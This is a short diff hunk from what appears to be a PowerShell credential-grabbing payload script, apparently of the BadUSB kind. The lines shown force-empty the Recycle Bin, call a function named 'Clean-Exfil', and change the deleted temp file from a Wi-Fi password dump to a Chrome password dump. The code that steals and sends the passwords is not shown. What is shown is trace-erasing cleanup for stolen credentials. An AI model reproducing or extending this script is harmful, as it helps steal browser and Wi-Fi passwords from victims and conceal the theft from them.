@@ -185,4 +185,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
-RI $env:TEMP/--wifi-pass.txt
+RI $env:TEMP/--chrome-pass.txt
